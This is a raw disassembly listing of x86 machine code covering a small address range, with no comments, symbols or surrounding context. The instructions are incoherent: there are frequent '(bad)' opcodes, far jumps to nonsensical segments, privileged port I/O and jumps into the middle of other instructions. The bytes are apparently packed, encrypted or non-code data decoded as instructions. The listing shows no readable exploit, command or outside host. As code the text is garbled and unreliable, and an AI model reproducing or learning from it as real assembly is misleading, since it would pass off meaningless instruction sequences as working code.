  42d23e:	retf   
  42d23f:	adc    eax,DWORD PTR [eax+0x3eba75]
  42d245:	cld    
  42d246:	jnp    0x42d245
  42d248:	inc    DWORD PTR [eax]
  42d24a:	add    BYTE PTR [eax],al
  42d24c:	add    BYTE PTR [eax],al
  42d24e:	jne    0x42d286
  42d250:	jp     0x42d1e5
  42d252:	xor    BYTE PTR [ebp-0x39],bh
  42d255:	shl    DWORD PTR [ebp-0x57],0x3e
  42d259:	dec    ecx
  42d25a:	test   al,0x72
  42d25c:	jnp    0x42d2a2
  42d25e:	and    DWORD PTR [ecx-0x54dc4716],edx
  42d264:	(bad)  
  42d265:	(bad)  
  42d266:	clc    
  42d267:	cs imul edi,esp,0x2
  42d26b:	(bad)  
  42d26c:	sar    bh,0xfa
  42d26f:	jmp    0x792f47aa
  42d274:	mov    esi,0xb7104b5a
  42d279:	mov    ebp,0x8729a979
  42d27e:	leave  
  42d27f:	sub    bl,dl
  42d281:	push   edi
  42d282:	clc    
  42d283:	jmp    0xa9fc567f
  42d288:	(bad)  
  42d289:	(bad)  
  42d28a:	clc    
  42d28b:	push   ebx
  42d28c:	clc    
  42d28d:	xor    DWORD PTR [ecx-0xb000157],0x1
  42d294:	cmp    ecx,DWORD PTR [esi+0x36]
  42d297:	cdq    
  42d298:	dec    edx
  42d299:	push   ss
  42d29a:	lock sahf 
  42d29c:	xchg   edx,eax
  42d29d:	push   eax
  42d29e:	pop    gs
  42d2a0:	jno    0x42d2ee
  42d2a2:	lods   eax,DWORD PTR ds:[esi]
  42d2a3:	jp     0x42d27b
  42d2a5:	les    edi,FWORD PTR ds:0xb584fea9
  42d2ab:	xchg   esi,eax
  42d2ac:	jmp    DWORD PTR [ebp+0x79]
  42d2af:	adc    bl,BYTE PTR [ebx+0xff]
  42d2b5:	add    BYTE PTR [eax],al
  42d2b7:	jb     0x42d262
  42d2b9:	xor    esi,0x7a
  42d2bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d2bd:	jg     0x42d253
  42d2bf:	jne    0x42d26a
  42d2c1:	(bad)  
  42d2c2:	cli    
  42d2c3:	xchg   ecx,eax
  42d2c4:	add    al,BYTE PTR [ecx+edx*4+0x7ae94014]
  42d2cb:	mov    cl,BYTE PTR [edx]
  42d2cd:	or     al,0x47
  42d2cf:	retf   
  42d2d0:	mov    esi,0x87bcdb05
  42d2d5:	sub    BYTE PTR [eax],al
  42d2d7:	sbb    bh,BYTE PTR [ecx]
  42d2d9:	pushw  ds
  42d2db:	jne    0x42d284
  42d2dd:	cmp    dh,bh
  42d2df:	out    0x41,eax
  42d2e1:	(bad)  
  42d2e3:	mov    WORD PTR [ebx],cs
  42d2e5:	pop    edx
  42d2e6:	inc    esp
  42d2e7:	and    DWORD PTR [edi+0x49c7f710],0xffffffe5
  42d2ee:	int    0x35
  42d2f0:	add    BYTE PTR ds:0x28736ffe,dl
  42d2f6:	lock fistp DWORD PTR [eax+0x6e]
  42d2fa:	lds    esi,FWORD PTR [ebp-0x457d1a57]
  42d300:	mov    ebx,0xc5a377d
  42d305:	(bad)  
  42d306:	fstp   TBYTE PTR [esi]
  42d308:	mov    ah,0xa8
  42d30a:	div    DWORD PTR [esi+0x36]
  42d30d:	jmp    0x42d305
  42d30f:	pop    es
  42d310:	inc    edx
  42d311:	repz fidivr DWORD PTR [edi+edi*2+0x30]
  42d316:	(bad)  
  42d317:	fwait
  42d318:	clc    
  42d319:	jmp    0x42d3ac
  42d31e:	add    BYTE PTR [eax],al
  42d320:	push   0x18
  42d322:	adc    ebp,DWORD PTR ds:[esi+0x73]
  42d326:	test   al,0xe7
  42d328:	xchg   ebx,eax
  42d329:	in     al,dx
  42d32a:	icebp  
  42d32b:	mov    ?,WORD PTR [edx]
  42d32d:	sbb    ah,dh
  42d32f:	mov    ebx,0x20fe0bfd
  42d334:	mov    dh,0x3
  42d336:	inc    ecx
  42d337:	pop    edi
  42d338:	xor    eax,0x7fe90e02
  42d33d:	jno    0x42d2e7
  42d33f:	mul    DWORD PTR [edi-0x2d]
  42d342:	inc    DWORD PTR [ecx]
  42d344:	imul   ecx,DWORD PTR ds:0xc362a9b3,0x52fede7
  42d34e:	or     edx,DWORD PTR [esi-0x3e3ef94a]
  42d354:	jne    0x42d38f
  42d356:	loopne 0x42d340
  42d358:	mov    ecx,0xf1a92f03
  42d35d:	js     0x42d3c4
  42d35f:	mov    esp,0xb768b84f
  42d364:	dec    esi
  42d365:	retf   
  42d366:	mov    esi,0x3d640d59
  42d36b:	jmp    0xe98037e3
  42d370:	popa   
  42d371:	fs cmp eax,0x3d6473e9
  42d377:	jmp    0xe98037e9
  42d37c:	mov    ah,BYTE PTR [ebp+edi*1-0x17]
  42d380:	lahf   
  42d381:	fs cmp eax,0xe9
  42d387:	add    BYTE PTR [eax],al
  42d389:	dec    edx
  42d38a:	fs cmp eax,0x3d6444e9
  42d390:	jmp    0xe98037d3
  42d395:	bound  esp,QWORD PTR [ebp+edi*1-0x17]
  42d399:	hlt    
  42d39a:	arpl   WORD PTR ds:0x3d633ce9,di
  42d3a0:	jmp    0xe98036c9
  42d3a5:	pop    ds
  42d3a6:	arpl   WORD PTR ds:0x3d6450e9,di
  42d3ac:	jmp    0xf1a89f38
  42d3b1:	cmpps  xmm2,XMMWORD PTR [ebp+0x51],0x71
  42d3b6:	or     DWORD PTR cs:[eax],edi
  42d3b9:	sahf   
  42d3ba:	out    dx,al
  42d3bb:	pop    ds
  42d3bc:	push   0xffffffee
  42d3be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d3bf:	out    0x0,al
  42d3c1:	pop    esi
  42d3c2:	outs   dx,BYTE PTR ds:[esi]
  42d3c3:	loop   0x42d40f
  42d3c5:	loope  0x42d396
  42d3c7:	xchg   DWORD PTR [ecx+ebx*8],eax
  42d3ca:	(bad)
  42d3cd:	dec    esp
  42d3ce:	ds cmp ecx,0x45c
  42d3d5:	scas   al,BYTE PTR es:[edi]
  42d3d6:	ins    DWORD PTR es:[edi],dx
  42d3d7:	stos   BYTE PTR es:[edi],al
  42d3d8:	add    DWORD PTR [edi],ecx
  42d3da:	cmp    DWORD PTR [eax],0x0
  42d3dd:	mov    eax,ds:0x1c4062ab
  42d3e2:	add    eax,0x5b1d6af0
  42d3e7:	add    BYTE PTR [edx+0xc],ch
  42d3ea:	out    0xf6,eax
  42d3ec:	adc    eax,0x0
  42d3f1:	add    BYTE PTR [esi+ebp*4+0x3a],bl
  42d3f5:	add    BYTE PTR [ecx+0x3d0573be],ah
  42d3fb:	mov    bh,0x2c
  42d3fd:	ror    bh,0x8d
  42d400:	inc    edx
  42d402:	xchg   ebp,eax
  42d403:	clc    
  42d404:	pop    es
  42d405:	dec    eax
  42d406:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d407:	push   edx
  42d408:	or     DWORD PTR [ebx+0x667b04b2],eax
  42d40e:	rol    BYTE PTR [ebx+eiz*8],1
  42d411:	inc    ecx
  42d412:	dec    edi
  42d413:	mov    al,0xf5
  42d415:	sbb    BYTE PTR [ecx-0x23bc2ab2],0x4
  42d41c:	jne    0x42d453
  42d41e:	add    edi,DWORD PTR [esi-0x3e]
  42d421:	aad    0xf
  42d423:	add    eax,0xa8d1ff4f
  42d428:	or     DWORD PTR [eax-0x64],eax
  42d42b:	test   BYTE PTR [ebx],bh
  42d42d:	jo     0x42d3b0
  42d42f:	inc    ebx
  42d430:	add    BYTE PTR [eax],al
  42d432:	loope  0x42d3d9
  42d434:	loop   0x42d4b0
  42d436:	pop    ebx
  42d437:	mov    edi,0x525c84f5
  42d43c:	push   es
  42d43d:	xor    DWORD PTR [ebp-0x3a],0x4a
  42d441:	aad    0x36
  42d443:	stos   DWORD PTR es:[edi],eax
  42d444:	inc    cl
  42d446:	js     0x42d481
  42d448:	stos   BYTE PTR es:[edi],al
  42d449:	ds jne 0x42d3f6
  42d44c:	sub    edi,ebx
  42d44e:	mov    cl,dl
  42d450:	out    dx,eax
  42d451:	aas    
  42d452:	jne    0x42d3dc
  42d454:	ja     0x42d417
  42d456:	add    BYTE PTR [eax],al
  42d458:	add    BYTE PTR [eax],al
  42d45a:	add    BYTE PTR [esi],dh
  42d45c:	clc    
  42d45d:	js     0x42d44e
  42d45f:	(bad)  
  42d460:	(bad)  
  42d462:	inc    edi
  42d463:	lods   eax,DWORD PTR ds:[esi]
  42d464:	push   ebp
  42d465:	jecxz  0x42d3ed
  42d467:	mov    bl,0x9d
  42d469:	jns    0x42d42a
  42d46b:	test   eax,0x80fb2ea8
  42d470:	fldz   
  42d472:	aas    
  42d473:	jne    0x42d499
  42d475:	or     eax,0xf6ee2385
  42d47a:	gs jne 0x42d474
  42d47d:	les    edx,FWORD PTR [ecx+eax*4]
  42d480:	mov    ecx,0x6ca3003e
  42d485:	sub    DWORD PTR [edi+0x5230fb09],eax
  42d48b:	(bad)  
  42d48c:	cmp    DWORD PTR [eax+0x41],edi
  42d48f:	jge    0x42d482
  42d491:	cmp    edx,DWORD PTR [ebx+0x69]
  42d494:	push   cs
  42d495:	fadd   QWORD PTR [esi-0x26]
  42d498:	sub    ah,al
  42d49a:	xor    DWORD PTR [ebp-0x4ad2052a],0x54
  42d4a1:	inc    ebp
  42d4a2:	lea    eax,[ebx-0x5b]
  42d4a5:	(bad)  
  42d4a7:	jl     0x42d451
  42d4a9:	dec    ecx
  42d4aa:	xor    dh,bh
  42d4ac:	mul    BYTE PTR ds:0x6db6
  42d4b1:	repnz inc edi
  42d4b3:	sub    cl,bl
  42d4b5:	mov    ebx,0x7e9d9944
  42d4ba:	call   DWORD PTR [edx+0xfc0e02]
  42d4c0:	add    BYTE PTR [eax],al
  42d4c2:	add    BYTE PTR [eax],al
  42d4c4:	mov    bh,0x3d
  42d4c6:	sbb    eax,0xe902f500
  42d4cb:	sub    al,0x2a
  42d4cd:	push   ebx
  42d4ce:	or     cl,BYTE PTR [esi+0x71]
  42d4d1:	mov    bh,0xba
  42d4d3:	les    eax,FWORD PTR [ecx+0x7543d93a]
  42d4d9:	jge    0x42d503
  42d4db:	dec    esi
  42d4dc:	jno    0x42d467
  42d4de:	leave  
  42d4df:	fcom   DWORD PTR [ebx]
  42d4e1:	push   ebx
  42d4e2:	loop   0x42d51d
  42d4e4:	jns    0x42d49d
  42d4e6:	push   ebx
  42d4e7:	or     al,0x3e
  42d4e9:	out    dx,eax
  42d4ea:	rcr    DWORD PTR [ecx],1
  42d4ec:	mov    ecx,0xbd042912
  42d4f1:	scas   eax,DWORD PTR es:[edi]
  42d4f2:	mov    al,ds:0xce42351f
  42d4f7:	repnz sti 
  42d4f9:	push   ebp
  42d4fb:	fimul  WORD PTR [ebx-0x37]
  42d4fe:	out    dx,eax
  42d4ff:	pusha  
  42d500:	xor    DWORD PTR [eax],0xaa18f02
  42d506:	jmp    0xf5d3:0xd6116679
  42d50d:	mov    ds:0x2750489,eax
  42d512:	test   al,0xac
  42d514:	jb     0x42d509
  42d516:	in     al,0x98
  42d518:	and    ah,BYTE PTR [edx-0x4cbfbdb]
  42d51e:	sbb    edx,DWORD PTR [eax]
  42d520:	arpl   WORD PTR [ecx+0x1050a6f],sp
  42d526:	mov    edx,0x61
  42d52b:	add    BYTE PTR [eax],al
  42d52d:	sub    cl,cl
  42d52f:	es or  al,0x75
  42d532:	dec    ebp
  42d533:	pop    esi
  42d534:	mov    al,0x45
  42d536:	mov    ebx,DWORD PTR [eax+0x3a4bf80b]
  42d53c:	dec    ebp
  42d53d:	inc    edi
  42d53e:	add    BYTE PTR cs:[ebp-0x4b00630d],ch
  42d545:	add    BYTE PTR [eax+0x75],0xf9
  42d549:	mov    edi,0x76f5fc3d
  42d54e:	add    al,BYTE PTR [eax]
  42d550:	add    ch,BYTE PTR [esi-0x3d]
  42d553:	inc    esp
  42d554:	or     eax,0xe9000289
  42d559:	sti    
  42d55a:	cmc    
  42d55b:	add    esi,DWORD PTR [edx-0x64]
  42d55e:	mov    dh,0x84
  42d560:	sub    DWORD PTR [ebp-0x1a1699e8],ebx
  42d566:	inc    esi
  42d567:	cld    
  42d568:	cmp    BYTE PTR [esi+0x3638fe1c],ch
  42d56e:	(bad)  
  42d570:	stc    
  42d571:	mov    dh,0x2
  42d573:	jg     0x42d546
  42d575:	jns    0x42d5a6
  42d577:	add    eax,0x73b66c00
  42d57c:	fldcw  WORD PTR [ebx]
  42d57e:	jbe    0x42d566
  42d580:	in     eax,0x20
  42d582:	jbe    0x42d56a
  42d584:	loope  0x42d589
  42d586:	mov    dh,0xf1
  42d588:	mov    ecx,0xe8b000f9
  42d58d:	xchg   esp,eax
  42d58e:	retf   
  42d58f:	mov    esi,0x3c
  42d594:	add    BYTE PTR [eax],al
  42d596:	jmp    0x5245:0x827d7ea9
  42d59d:	je     0x42d54c
  42d59f:	scas   al,BYTE PTR es:[edi]
  42d5a0:	out    0xf5,eax
  42d5a2:	mov    ah,0xb8
  42d5a4:	cli    
  42d5a5:	jbe    0x42d544
  42d5a7:	push   es
  42d5a8:	xchg   DWORD PTR [edi+0x51082eb7],esp
  42d5ae:	adc    bh,BYTE PTR [edx+edi*8+0x7375fa5e]
  42d5b5:	out    0xeb,al
  42d5b7:	ret    
  42d5b8:	out    0xd2,eax
  42d5ba:	mov    bh,0xb8
  42d5bc:	cli    
  42d5bd:	add    BYTE PTR [eax],bl
  42d5bf:	shr    DWORD PTR [esi+0x4],0x1f
  42d5c3:	(bad)  
  42d5c4:	loop   0x42d5c8
  42d5c6:	sahf   
  42d5c7:	aam    0x8b
  42d5c9:	inc    ebp
  42d5ca:	dec    eax
  42d5cb:	imul   ebx,DWORD PTR [eax+0x58c053fe],0xc9544f8a
  42d5d5:	ret    0x194
  42d5d8:	or     DWORD PTR ds:0x3961c0,0xa
  42d5df:	lods   al,BYTE PTR ds:[esi]
  42d5e0:	mov    edx,0x6ec6d957
  42d5e5:	and    bh,dl
  42d5e7:	add    al,ah
  42d5e9:	fistp  WORD PTR [edi]
  42d5eb:	add    DWORD PTR [ebx+0x31acc7d7],eax
  42d5f1:	je     0x42d66b
  42d5f3:	adc    dh,BYTE PTR [ebp+0x5]
  42d5f6:	iret   
  42d5f7:	shl    ch,0x75
  42d5fa:	add    BYTE PTR [eax],al
  42d5fc:	add    BYTE PTR [eax],al
  42d5fe:	add    BYTE PTR [esi],ch
  42d600:	inc    ecx
  42d601:	add    edx,0x924
  42d607:	ja     0x42d5ca
  42d609:	ins    BYTE PTR es:[edi],dx
  42d60a:	call   0x5e98972e
  42d60f:	fimul  WORD PTR [ecx]
  42d611:	add    BYTE PTR [ecx-0x24],ch
  42d614:	add    eax,0xfe0c0008
  42d619:	mov    esi,0xb86ddeb
  42d61e:	mov    esp,0x56003efc
  42d623:	mov    ebp,DWORD PTR [edi+0x7d0c33f5]
  42d629:	(bad)  
  42d62a:	je     0x42d5d6
  42d62c:	test   DWORD PTR [ebx],edx
  42d62e:	les    eax,FWORD PTR [ebx]
  42d630:	aas    
  42d631:	add    BYTE PTR [ebx-0xc780d2],cl
  42d637:	test   al,0x3
  42d639:	inc    eax
  42d63a:	xor    DWORD PTR [ebp-0x1b],0xab75080b
  42d641:	sti    
  42d642:	shl    BYTE PTR [edi],0xfb
  42d645:	lods   al,BYTE PTR ds:[esi]
  42d646:	or     ecx,DWORD PTR [ebx+ebp*8]
  42d649:	or     ecx,DWORD PTR [eax]
  42d64b:	jne    0x42d5f8
  42d64d:	add    edi,DWORD PTR [esi+0x2b32f2fe]
  42d653:	xor    al,0x92
  42d655:	lds    eax,FWORD PTR [edi]
  42d657:	ins    DWORD PTR es:[edi],dx
  42d658:	stos   DWORD PTR es:[edi],eax
  42d659:	(bad)  
  42d65a:	mov    ecx,0x44ebb1
  42d65f:	pop    ebp
  42d660:	out    0xb3,al
  42d662:	cld    
  42d663:	add    BYTE PTR [eax],al
  42d665:	add    BYTE PTR [eax],al
  42d667:	add    BYTE PTR [edx+0x26],ch
  42d66a:	les    esi,FWORD PTR [ebx-0x6b]
  42d66d:	xor    bl,bh
  42d66f:	mov    ebx,0x68fe6955
  42d674:	push   edx
  42d675:	mov    ds:0x9c750006,al
  42d67a:	add    DWORD PTR [ebp+edx*2+0x79ff03e9],edi
  42d681:	fistp  QWORD PTR gs:[esi]
  42d684:	jne    0x42d6d3
  42d686:	push   es
  42d687:	xchg   DWORD PTR [ecx+0x7a891005],esi
  42d68d:	xor    al,cl
  42d68f:	pop    edx
  42d690:	mov    ebx,0xd4000267
  42d695:	and    eax,0xf4753e9f
  42d69a:	mov    edi,?
  42d69c:	clc    
  42d69d:	imul   esi,DWORD PTR [edx],0xc2b6ee41
  42d6a3:	fidiv  DWORD PTR [esi]
  42d6a5:	test   eax,0x725cc78b
  42d6aa:	push   es
  42d6ab:	or     BYTE PTR [ebp-0x57],dh
  42d6ae:	mov    DWORD PTR [ebx-0x547ce7c],ecx
  42d6b4:	shr    BYTE PTR [eax],cl
  42d6b6:	idiv   dl
  42d6b8:	inc    eax
  42d6b9:	add    dh,al
  42d6bb:	or     ch,0xa
  42d6be:	icebp  
  42d6bf:	add    esi,DWORD PTR [ebp+0x43]
  42d6c2:	fdiv   QWORD PTR [ebp+0x1dd4ba6b]
  42d6c8:	bnd ret 
  42d6ca:	iret   
  42d6cb:	retf   0x0
  42d6ce:	add    BYTE PTR [eax],al
  42d6d0:	add    BYTE PTR [edx+0xa],bh
  42d6d3:	jmp    0x2cb71ddb
  42d6d8:	loopne 0x42d72d
  42d6da:	add    al,BYTE PTR [ecx+0x2c]
  42d6dd:	test   DWORD PTR [ebp+0x76418a21],esi
  42d6e3:	or     BYTE PTR [ebp+esi*2+0x54],al
  42d6e7:	mov    dl,0xc4
  42d6e9:	leave  
  42d6ea:	xchg   esp,edi
  42d6ec:	push   ebx
  42d6ed:	and    bl,BYTE PTR [esi+0x8]
  42d6f0:	inc    esp
  42d6f1:	jne    0x42d742
  42d6f3:	cli    
  42d6f4:	adc    eax,0x3a90f81
  42d6f9:	shl    BYTE PTR ds:0x7e7fc0e1,cl
  42d6ff:	mov    ecx,0x66027504
  42d704:	inc    ecx
  42d705:	imul   eax,DWORD PTR [edx],0x24187e2
  42d70b:	jmp    0xd9788113
  42d710:	add    ebp,DWORD PTR [esi+0x7e]
  42d713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d714:	add    al,0x75
  42d716:	add    dh,BYTE PTR [edx-0x615582c7]
  42d71c:	mov    esi,0xc46bb30f
  42d721:	mov    DWORD PTR [edx],edx
  42d723:	call   0xefbe:0x93aa6d39
  42d72a:	mov    dl,0x63
  42d72c:	les    edi,FWORD PTR [edi+0x7e]
  42d72f:	dec    ecx
  42d730:	add    al,0x75
  42d732:	add    dh,BYTE PTR [ebx+0x49]
  42d735:	add    BYTE PTR [eax],al
  42d737:	add    BYTE PTR [eax],al
  42d739:	add    BYTE PTR [ecx+0x2a1f0001],al
  42d73f:	or     bl,BYTE PTR cs:[ecx+ecx*2+0x1]
  42d744:	add    al,0xe9
  42d746:	jbe    0x42d6cd
  42d748:	scas   eax,DWORD PTR es:[edi]
  42d749:	out    0x6e,eax
  42d74b:	add    al,BYTE PTR [eax]
  42d74d:	inc    edx
  42d74e:	add    BYTE PTR [ebp+0x6305e577],0x3
  42d755:	in     eax,dx
  42d756:	jbe    0x42d75a
  42d758:	jg     0x42d716
  42d75a:	xchg   BYTE PTR [edx],al
  42d75c:	xchg   DWORD PTR [edx+eax*4+0x40e14489],ebp
  42d763:	xor    DWORD PTR [esi+0x274e9],esi
  42d769:	loopne 0x42d788
  42d76b:	adc    ch,BYTE PTR [edi-0x13]
  42d76e:	xor    DWORD PTR [ebp+0x54],0xfffffff9
  42d772:	jnp    0x42d7e9
  42d774:	add    esi,esi
  42d776:	jmp    0x42d74f
  42d778:	(bad)  
  42d779:	sub    eax,ebx
  42d77b:	mov    cl,0xfe
  42d77d:	call   0x7803d0f8
  42d782:	fs jmp 0x4932748
  42d788:	or     edx,DWORD PTR [esi-0x5200ac98]
  42d78e:	(bad)  
  42d78f:	push   ebp
  42d790:	call   0xfaf1be28
  42d795:	imul   BYTE PTR [ebx+0x5dbe4f03]
  42d79b:	cli    
  42d79c:	(bad)  
  42d79d:	lods   eax,DWORD PTR ds:[esi]
  42d79e:	add    BYTE PTR [eax],al
  42d7a0:	add    BYTE PTR [eax],al
  42d7a2:	add    BYTE PTR [esi+0x35b9a69a],ah
  42d7a8:	lods   eax,DWORD PTR ds:[esi]
  42d7a9:	popa   
  42d7aa:	call   0x7528117
  42d7af:	or     BYTE PTR [ebx+ecx*1],al
  42d7b2:	pop    esi
  42d7b3:	adc    BYTE PTR [ebx-0x1],0xa5
  42d7b7:	inc    esi
  42d7b8:	push   ebp
  42d7b9:	call   0xfbb819be
  42d7be:	dec    ebx
  42d7c0:	cmp    BYTE PTR [ecx],al
  42d7c2:	push   0xffffffdc
  42d7c4:	pop    eax
  42d7c5:	call   0xf5b272f3
  42d7ca:	test   DWORD PTR [edx+ebp*8-0x206fe20],ecx
  42d7d1:	sub    BYTE PTR [ebp-0x54],bl
  42d7d4:	jmp    0x39:0x65f0bb93
  42d7db:	push   DWORD PTR [eax+0x13]
  42d7de:	sbb    BYTE PTR [edi-0x15a0ffbb],bh
  42d7e4:	pop    esp
  42d7e5:	std    
  42d7e6:	push   edx
  42d7e7:	pop    ebx
  42d7e8:	or     bl,BYTE PTR [eax]
  42d7ea:	adc    ecx,esp
  42d7ec:	add    eax,0x154e5d53
  42d7f1:	add    BYTE PTR [edi-0x27],dl
  42d7f4:	out    dx,eax
  42d7f5:	add    ebp,ebx
  42d7f7:	fs out 0x28,eax
  42d7fa:	xchg   BYTE PTR [eax+0x9],dl
  42d7fd:	add    BYTE PTR [eax],al
  42d7ff:	dec    ebx
  42d800:	cmp    BYTE PTR [ecx+0x56004],cl
  42d806:	push   ecx
  42d807:	add    BYTE PTR [eax],al
  42d809:	add    BYTE PTR [eax],al
  42d80b:	add    BYTE PTR [edi-0x38],bl
  42d80e:	dec    edx
  42d80f:	push   edi
  42d810:	and    al,0x49
  42d812:	lock std 
  42d814:	sbb    edi,edi
  42d816:	scas   al,BYTE PTR es:[edi]
  42d817:	xchg   BYTE PTR [eax],ah
  42d819:	or     DWORD PTR [eax],eax
  42d81b:	add    BYTE PTR [esi+0xe84f05],dh
  42d821:	xor    cl,bh
  42d823:	call   DWORD PTR [ecx+0x6bd573c6]
  42d829:	ret    
  42d82a:	dec    ebp
  42d82b:	mov    edi,0x3965f0
  42d830:	inc    ebx
  42d831:	outs   dx,DWORD PTR ds:[esi]
  42d832:	adc    edx,DWORD PTR [edi+edi*8]
  42d835:	inc    esp
  42d836:	add    BYTE PTR [ebx+0x7e81775],al
  42d83c:	jmp    0x6bf:0x69fb1216
  42d843:	call   0xfb00066e
  42d848:	clc    
  42d849:	pop    edx
  42d84a:	aaa    
  42d84b:	or     DWORD PTR [ebx],esp
  42d84d:	and    al,0xb4
  42d84f:	out    0x19,eax
  42d851:	sub    BYTE PTR [ebp-0x4487e406],bh
  42d857:	adc    al,0x8d
  42d859:	lods   al,BYTE PTR ds:[esi]
  42d85a:	add    BYTE PTR ds:[edx-0x23],cl
  42d85e:	pop    es
  42d85f:	add    BYTE PTR [ebp-0x650633e0],cl
  42d865:	les    esi,FWORD PTR es:[ebx+0x36]
  42d869:	xchg   ecx,eax
  42d86a:	push   ebx
  42d86b:	mov    ebx,0x413ad1
  42d870:	add    BYTE PTR [eax],al
  42d872:	add    BYTE PTR [eax],al
  42d874:	add    BYTE PTR [edx],ch
  42d876:	call   0x5ba8ec8d
  42d87b:	(bad)  
  42d87c:	cli    
  42d87d:	jmp    0xef2ae33f
  42d882:	(bad)  
  42d883:	mov    esp,0x81a9eefa
  42d888:	icebp  
  42d889:	loope  0x42d859
  42d88b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d88c:	ins    BYTE PTR es:[edi],dx
  42d88d:	push   edx
  42d88e:	mov    ecx,0xa07b7ebb
  42d893:	out    dx,eax
  42d894:	mov    edi,0x38532db
  42d899:	jno    0x42d834
  42d89b:	(bad)  
  42d89c:	popa   
  42d89d:	cld    
  42d89e:	pop    ds
  42d89f:	add    eax,0xa6997508
  42d8a4:	or     BYTE PTR [ebx],ah
  42d8a6:	leave  
  42d8a7:	mov    ebx,0x16d71a52
  42d8ac:	lgs    ebx,FWORD PTR [ecx+0x70a5a5b]
  42d8b3:	sbb    al,0x12
  42d8b5:	mov    ch,0x2
  42d8b7:	jmp    0x32e1cb12
  42d8bc:	mov    ebp,0x36921669
  42d8c1:	test   DWORD PTR [edi+0x35de1013],ebp
  42d8c7:	icebp  
  42d8c8:	mov    esp,0x43d30e81
  42d8cd:	jne    0x42d94a
  42d8cf:	js     0x42d857
  42d8d1:	les    esi,FWORD PTR [eax]
  42d8d3:	shr    BYTE PTR [ebx-0x439d4596],cl
  42d8d9:	add    BYTE PTR [eax],al
  42d8db:	add    BYTE PTR [eax],al
  42d8dd:	add    dh,dh
  42d8df:	ret    0xdd4
  42d8e2:	sbb    eax,DWORD PTR [ecx]
  42d8e4:	mov    ebx,0x49fe21bc
  42d8e9:	ss ins DWORD PTR es:[edi],dx
  42d8eb:	call   0xc56d:0xaf9fbdda
  42d8f2:	sub    al,0x4d
  42d8f4:	daa    
  42d8f5:	adc    esi,DWORD PTR [ebp+0x55]
  42d8f8:	pop    esi
  42d8f9:	scas   eax,DWORD PTR es:[edi]
  42d8fa:	and    al,0x7b
  42d8fc:	fwait
  42d8fd:	pop    ss
  42d8fe:	es scas eax,DWORD PTR es:[edi]
  42d900:	xchg   ebx,eax
  42d901:	jecxz  0x42d8fe
  42d903:	sub    al,0xe5
  42d905:	mov    esp,0x360a0ee1
  42d90a:	jge    0x42d964
  42d90c:	add    dh,BYTE PTR [esi]
  42d90e:	test   DWORD PTR [edi-0x6],edx
  42d911:	xor    eax,0xb3dbaf7d
  42d916:	popa   
  42d917:	inc    edx
  42d918:	jmp    0x6c5192a7
  42d91d:	(bad)
  42d921:	mov    dl,0xa6
  42d923:	out    dx,al
  42d924:	ror    cl,0x37
  42d927:	mov    al,0xc9
  42d929:	and    dl,0x35
  42d92c:	test   BYTE PTR [esi-0x2109ac9c],0xf9
  42d933:	mov    bh,0xff
  42d935:	cmp    al,0x18
  42d937:	clc    
  42d938:	pop    esp
  42d939:	(bad)  [ebx-0x1a]
  42d93c:	xchg   ch,ch
  42d93e:	pop    ds
  42d93f:	jp     0x42d985
  42d941:	leave  
  42d942:	add    BYTE PTR [eax],al
  42d944:	add    BYTE PTR [eax],al
  42d946:	add    bl,dh
  42d948:	shr    BYTE PTR [ebp-0x16],0xf9
  42d94c:	xor    eax,0xab780320
  42d951:	je     0x42d91c
  42d953:	pop    ds
  42d954:	xor    ebx,ebx
  42d956:	in     eax,0xf
  42d958:	or     BYTE PTR ss:[ecx+0x6efaae5c],al
  42d95f:	cmp    ah,bh
  42d961:	je     0x42d96c
  42d963:	test   bl,dl
  42d965:	push   esi
  42d966:	jb     0x42d99c
  42d968:	push   cs
  42d969:	pop    ebx
  42d96a:	mov    bh,0x4d
  42d96c:	jo     0x42d989
  42d96e:	jmp    0xa02e60b8
  42d973:	fbstp  TBYTE PTR ds:0x12443e14
  42d979:	sti    
  42d97a:	mov    esp,0xe174ab72
  42d97f:	mov    edi,0x36fcbc15
  42d984:	add    al,BYTE PTR [edi+0x77b3f419]
  42d98a:	int3   
  42d98b:	push   ds
  42d98c:	sbb    al,bl
  42d98e:	nop    DWORD PTR [edx-0x787d8241]
  42d995:	icebp  
  42d996:	je     0x42d918
  42d998:	test   eax,0x8a1ee174
  42d99d:	stc    
  42d99e:	out    dx,al
  42d99f:	jmp    DWORD PTR [ecx+ecx*1-0x4af8ead]
  42d9a6:	push   esp
  42d9a7:	jge    0x42d952
  42d9a9:	je     0x42d98c
  42d9ab:	add    BYTE PTR [eax],al
  42d9ad:	add    BYTE PTR [eax],al
  42d9af:	add    dh,bl
  42d9b1:	dec    ecx
  42d9b2:	std    
  42d9b3:	into   
  42d9b4:	fild   WORD PTR [ecx+eax*8-0x45b4ae00]
  42d9bb:	adc    BYTE PTR [ebx+edx*2],bl
  42d9be:	sub    esp,0x6f
  42d9c1:	push   eax
  42d9c2:	xor    DWORD PTR [ebp+0x28],0x51
  42d9c6:	div    DWORD PTR [ebp+0x2c]
  42d9c9:	jge    0x42da46
  42d9cb:	or     al,0x13
  42d9cd:	repz sbb edi,edi
  42d9d0:	mov    DWORD PTR [esi],ecx
  42d9d2:	dec    esi
  42d9d3:	dec    DWORD PTR [ecx-0x2600b0ea]
  42d9d9:	stc    
  42d9da:	not    BYTE PTR ds:0x401300
  42d9e0:	push   ebp
  42d9e1:	inc    edx
  42d9e2:	sbb    al,0x85
  42d9e4:	or     al,0xf3
  42d9e6:	aas    
  42d9e7:	test   DWORD PTR [edx],ebx
  42d9e9:	fst    QWORD PTR [esi-0x18]
  42d9ec:	scas   al,BYTE PTR es:[edi]
  42d9ed:	sar    al,0xff
  42d9f0:	sbb    cl,al
  42d9f2:	outs   dx,BYTE PTR ds:[esi]
  42d9f3:	push   esi
  42d9f4:	pop    ss
  42d9f5:	mov    bl,0x29
  42d9f7:	fisttp DWORD PTR [ecx]
  42d9f9:	jae    0x42da69
  42d9fb:	dec    esi
  42d9fc:	ja     0x42da49
  42d9fe:	adc    BYTE PTR [ebx-0x2b],dh
  42da01:	jl     0x42da01
  42da03:	ficom  WORD PTR ds:0x4a3b2042
  42da09:	idiv   edx
  42da0b:	mov    BYTE PTR [ecx],cl
  42da0d:	mov    eax,ds:0xf2830064
  42da12:	pop    ds
  42da13:	inc    DWORD PTR [eax]
  42da15:	add    BYTE PTR [eax],al
